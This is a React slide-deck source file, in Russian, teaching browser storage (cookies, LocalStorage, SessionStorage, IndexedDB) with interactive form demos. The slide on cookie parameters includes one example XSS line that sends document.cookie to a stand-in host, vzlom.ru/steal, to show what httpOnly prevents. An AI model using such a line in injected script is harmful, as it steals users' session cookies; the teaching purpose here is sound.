import React, {FC, useState} from 'react';
import {Input} from '@hh.ru/magritte-ui';
import {
    Appear,
    ListItem,
    Slide,
    UnorderedList,
    Text,
    Link,
    Table,
    TableHeader,
    TableRow,
    TableCell,
    TableBody, FlexBox
} from 'spectacle';
import {H1, H3} from '../../components/typography';
import CodePaneJS from '../../components/CodePaneJS';
import SlideQuestions from '../../components/SlideQuestions';
import CodeExampleButton from '../../components/CodeExampleButton';
import {exampleCookie, exampleServerSentCookie} from '../../examples/cookie';
import {exampleLocalStorage} from '../../examples/localStorage';
import SlideUsefulLinks from '../../components/SlideUsefulLinks';
import CodeContainer from '../../components/CodeContainer';

const LocalStorages: FC = () => {
    const [sessionFirstName, setSessionFirstName] = useState<string>(window.sessionStorage.getItem('from') || '');
    const [sessionLastName, setSessionLastName] = useState<string>(window.sessionStorage.getItem('to') || '');
    const [lsFirstName, setLSFirstName] = useState<string>(window.localStorage.getItem('name') || '');
    const [lsLastName, setLSLastName] = useState<string>(window.localStorage.getItem('surname') || '');

    return (
        <>
            <Slide>
                <H1>Локальные хранилища данных</H1>
                <UnorderedList>
                    <Appear><ListItem>Cookie</ListItem></Appear>
                    <Appear><ListItem>LocalStorage</ListItem></Appear>
                    <Appear><ListItem>SessionStorage</ListItem></Appear>
                    <Appear><ListItem>IndexedDB</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>Зачем вообще нужны локальные хранилища?</H3>
                <UnorderedList>
                    <Appear><ListItem>HTTP — протокол без состояния. Каждый запрос "не помнит" предыдущий</ListItem></Appear>
                    <Appear><ListItem>Чтобы браузер мог что-то "помнить" между страницами и сессиями, нужны локальные хранилища</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>Cookie</H3>
                <UnorderedList>
                    <Appear><ListItem>Что это?</ListItem></Appear>
                    <Appear><ListItem>Для чего?</ListItem></Appear>
                    <Appear><ListItem>Как использовать?</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>Что это? Для чего?</H3>
                <Text>Исторически 1й механизм для хранения данных локально</Text>
                <UnorderedList>
                    <Appear><ListItem>Придуман для передачи состояния между клиентом и сервером</ListItem></Appear>
                    <Appear><ListItem>Используется для авторизации, трекинга, сохранения настроек, персонализации контента и т.д.</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>Обычно куки устанавливает сервер</H3>
                <CodePaneJS>
                    {`
POST https://hh.ru/login HTTP/1.1
// в теле запроса передаем логин / пароль
{"username": "mailbox@yandex.ru", "password": "123"}
                    `}
                </CodePaneJS>
                <CodePaneJS>
                    {`
HTTP/1.1 200 OK
Set-Cookie: auth=r2d2; HttpOnly; Secure // сервер авторизовал и установил куки
Set-Cookie: role=client
                    `}
                </CodePaneJS>
                <CodePaneJS>
                    {`
// ‼️ cookie доступны всем вкладкам в пределах домена
// ‼️ В дальнейшем браузер автоматически добавляет куки к каждому запросу на этот домен
// ℹ️ На домен можно назначить сотни, каждая не более 4кб

GET https://hh.ru/api/tasks?limit=50 HTTP/1.1
Cookie: auth=r2d2;role=client
                    `}
                </CodePaneJS>
                <CodeContainer>
                    <CodeExampleButton code={exampleServerSentCookie} url={'http://localhost:8000/server_set_cookies'}/>
                </CodeContainer>
            </Slide>
            <Slide>
                <H3>Основные параметры (не обязательные)</H3>
                <CodePaneJS>
                {`
                        Set-Cookie: role=student;secure;max-age=3600
                        
                        httpOnly:
                            кука будет недоступна из JS для чтения/изменения, в HTTP запросах отправляется
                            fetch("https://vzlom.ru/steal?cookie=" + document.cookie)  // защита от XSS-атаки
                        domain (hh.ru):
                            определяет домен, для которого указана кука
                        secure: 
                            указывает, что данная кука может быть передана только при запросах по HTTPS протоколу
                        max-age:
                            указывает, через сколько секунд кука станет недействительна
                        expires: (Thu Jan 30 2025 15:32:03 GMT+0300):
                            указывает точное время, когда кука станет недействительна
                        // Если не указать время жизни кука становится сессионной — живёт до закрытия браузера (не вкладки).
                    `}
                </CodePaneJS>
                <CodeContainer>
                    <CodeExampleButton code={exampleCookie} url={'http://localhost:8000/with_cookies'}>
                         Cookie можно так же установить с помощью JS
                    </CodeExampleButton>
                </CodeContainer>
            </Slide>
            <Slide>
                <H3>LocalStorage</H3>
                <UnorderedList>
                    <Appear><ListItem>Что это?</ListItem></Appear>
                    <Appear><ListItem>Для чего?</ListItem></Appear>
                    <Appear><ListItem>Как использовать?</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>Что это?</H3>
                <UnorderedList>
                    <Appear><ListItem>Долговременное key-value хранилище (до 5MB на домен)</ListItem></Appear>
                    <Appear><ListItem>Может быть очищено браузером автоматически</ListItem></Appear>
                    <Appear><ListItem>И ключ и значение только строки</ListItem></Appear>
                    <Appear><ListItem>Данные доступны всем вкладкам и окнам с одним origin</ListItem></Appear>
                    <Appear><ListItem>Чтение и запись синхронные (блокирует поток)</ListItem></Appear>
                    <Appear><ListItem>LocalStorage мб не доступен (например в инкогнито)</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>Для чего?</H3>
                <UnorderedList>
                    <Appear><ListItem>Сохранение пользовательских данных (форма, тема)</ListItem></Appear>
                    <Appear><ListItem>Сокращение запросов к серверу (кэширование данных)</ListItem></Appear>
                    <Appear><ListItem>Работа приложения без интернета</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>Пример</H3>
                <Text>Есть форма, пользователь ввел свои данные и случайно закрыл вкладку</Text>
                <FlexBox flexDirection="column" style={{ gap: '12px' }}>
                    <Input
                        placeholder="Имя"
                        onChange={(value) => {
                            setLSFirstName(value);
                            localStorage.setItem('name', value)
                        }}
                        value={lsFirstName}
                    />
                    <Input
                        placeholder="Фамилия"
                        onChange={(value) => {
                            setLSLastName(value);
                            localStorage.setItem('surname', value)
                        }}
                        value={lsLastName}
                    />
                </FlexBox>
            </Slide>
            <Slide>
                <H3>Как использовать?</H3>
                <CodePaneJS>
                    {`
                        // Запись элемента
                        window.localStorage.setItem('data', '123')
                        // Чтение элемента
                        window.localStorage.getItem('data')
                        // Удаление элемента
                        localStorage.removeItem('data')
                        // Очистка хранилища
                        localStorage.clear()
                    `}
                </CodePaneJS>
                <CodeContainer>
                    <CodeExampleButton code={exampleLocalStorage} url="http://localhost:8000/local_storage">Инструменты разработчика Tab Application</CodeExampleButton>
                </CodeContainer>
            </Slide>
            <Slide>
                <H3>SessionStorage</H3>
                <UnorderedList>
                    <Appear><ListItem>Хранилище данных в формате ключ-значение (до 5MB)</ListItem></Appear>
                    <Appear><ListItem>API и принцип работы очень похож на LocalStorage</ListItem></Appear>
                    <Appear><ListItem>Данные хранятся пока жива сессия (вкладка)</ListItem></Appear>
                    <Appear><ListItem>При перезапуске браузера создастся новая сессия</ListItem></Appear>
                    <Appear><ListItem>Новая вкладка - новая сессия</ListItem></Appear>
                    <Appear><ListItem>Дублирование вкладки - копируется сессия</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>Для чего?</H3>
                <Text>Клиент ищет билеты, вводит параметры, уходит смотреть отели — в каждой вкладке свое состояние</Text>
                <FlexBox flexDirection="column" style={{ gap: '12px' }}>
                    <Input
                        placeholder="Откуда вылет?"
                        onChange={(value) => {
                            setSessionFirstName(value);
                            sessionStorage.setItem('from', value)
                        }}
                        value={sessionFirstName}
                    />
                    <Input
                        placeholder="Куда?"
                        onChange={(value) => {
                            setSessionLastName(value);
                            sessionStorage.setItem('to', value)
                        }}
                        value={sessionLastName}
                    />
                </FlexBox>
            </Slide>
            <Slide>
                <H3>Как использовать?</H3>
                <CodePaneJS>
                    {`
                        // Запись элемента
                        window.sessionStorage.setItem('data', '123')
                        // Чтение элемента
                        window.sessionStorage.getItem('data')
                        // Удаление элемента
                        sessionStorage.removeItem('data')
                        // Очистка хранилища
                        sessionStorage.clear()
                    `}
                </CodePaneJS>
            </Slide>
            <Slide>
                <H3>LocalStorage vs SessionStorage</H3>
                <Table>
                    <TableHeader>
                        <TableRow>
                            <TableCell>LocalStorage</TableCell>
                            <TableCell>SessionStorage</TableCell>
                        </TableRow>
                    </TableHeader>
                    <TableBody>
                        <TableRow>
                            <TableCell>Данные хранятся долго</TableCell>
                            <TableCell>Данные хранятся до закрытия вкладки</TableCell>
                        </TableRow>
                        <TableRow>
                            <TableCell>Состояние общее для всех вкладок домена</TableCell>
                            <TableCell>Свое состояние для каждой вкладки</TableCell>
                        </TableRow>
                    </TableBody>
                </Table>
            </Slide>
            <Slide>
                <H3>IndexedDB. Что это и зачем нужно?</H3>
                <UnorderedList>
                    <ListItem>Встроенная база данных</ListItem>
                    <Appear><ListItem>CRUD операции асинхронные – не блокируют поток</ListItem></Appear>
                    <Appear><ListItem>Объём — может достигать нескольких ГБ</ListItem></Appear>
                    <Appear><ListItem>Хранит любые типы данных</ListItem></Appear>
                    <Appear><ListItem>Есть таблицы, индексы, транзакции</ListItem></Appear>
                    <Appear><ListItem>Привязана к origin (протокол, домен, порт)</ListItem></Appear>
                    <Appear><ListItem>Сложное API — используют Dexie.js, idb</ListItem></Appear>
                    <Appear><ListItem>Больше подходит для сложных офлайн приложений</ListItem></Appear>
                </UnorderedList>
            </Slide>
            <Slide>
                <H3>IndexedDB. Пример</H3>
                <CodePaneJS>
                    {`
let db;

indexedDB.open("MyDB", 1).onupgradeneeded = (e) => {
  db = e.target.result;
  db.createObjectStore("users", { keyPath: "id" });
};
function saveData(user) {
  db.transaction("users", "readwrite").objectStore("users").add(user);
}
function getData(id) {
  db.transaction("users", "readonly").objectStore("users")
    .get(id).onsuccess = (e) => console.log(e.target.result);
}
// Использование
saveData({ id: 1, name: "Ivan" });
getData(1); // → { id: 1, name: "Ivan" }
                    `}
                </CodePaneJS>
            </Slide>
            <SlideUsefulLinks theme="Локальные хранилища данных">
                <Link href="https://doka.guide/js/cookie/" target="_blank">Cookie</Link>
                <Link href="https://doka.guide/js/local-storage/" target="_blank">LocalStorage</Link>
                <Link href="https://doka.guide/js/session-storage/" target="_blank">SessionStorage</Link>
                <Link href="https://learn.javascript.ru/indexeddb" target="_blank">IndexedDB</Link>
            </SlideUsefulLinks>
            <SlideQuestions />
        </>
    )
}

export default LocalStorages;
